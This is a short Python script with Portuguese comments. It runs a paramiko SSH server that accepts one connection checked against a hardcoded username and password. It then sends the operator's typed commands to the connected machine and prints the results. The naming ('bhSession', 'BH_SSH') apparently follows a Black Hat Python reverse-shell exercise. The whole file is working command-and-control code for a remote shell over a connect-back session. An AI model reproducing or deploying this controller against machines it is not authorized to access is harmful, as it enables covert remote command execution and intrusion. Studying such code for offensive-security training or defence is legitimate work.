import socket
import paramiko
import threading
import sys

# Corrigir a importação e o carregamento da chave RSA
# feito ontem -
host_key = paramiko.RSAKey.from_private_key_file('test_rsa.key')

class Server(paramiko.ServerInterface):
    def __init__(self):
        self.event = threading.Event()

    def check_channel_request(self, kind, chanid):
        if kind == 'session':
            return paramiko.OPEN_SUCCEEDED

    def check_auth_password(self, username, password):
        if username == 'roxyp' and password == '<lovepython>':
            return paramiko.AUTH_SUCCESSFUL
        return paramiko.AUTH_FAILED

# Validar argumentos
if len(sys.argv) < 3:
    print("Usage: script.py <server_ip> <ssh_port>")
    sys.exit(1)

server_ip = sys.argv[1]
ssh_port = int(sys.argv[2])

try:
    # Criar e configurar o socket do servidor
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((server_ip, ssh_port))
    sock.listen(100)
    print('[+] LISTENING FOR CONNECTION ...')
    client, addr = sock.accept()
except Exception as e:
    print('Listen failed: ' + str(e))
    sys.exit(1)

print(f'[+] GOT A CONNECTION FROM {addr[0]}:{addr[1]}')

try:
    bhSession = paramiko.Transport(client)
    bhSession.add_server_key(host_key)
    server = Server()

    try:
        bhSession.start_server(server=server)
    except paramiko.SSHException:
        print('[-] SSH negotiation failed')
        sys.exit(1)

    chan = bhSession.accept(20)
    print('[+] AUTHENTICATION SUCCESSFUL!')

    if chan is None:
        print("[-] No channel.")
        bhSession.close()
        sys.exit(1)

    chan.send('WELCOME TO BH_SSH'.encode())

    # Loop para receber comandos
    while True:
        command = input("Enter command: ").strip()
        if command != 'exit':
            chan.send(command.encode())
            response = chan.recv(1024).decode()
            print(response + '\n')
        else:
            chan.send('exit'.encode())
            print("EXITING...")
            bhSession.close()
            break

except Exception as e:
    print("[-] CAUGHT EXCEPTION: " + str(e))
    try:
        bhSession.close()
    except:
        pass
    sys.exit(1)


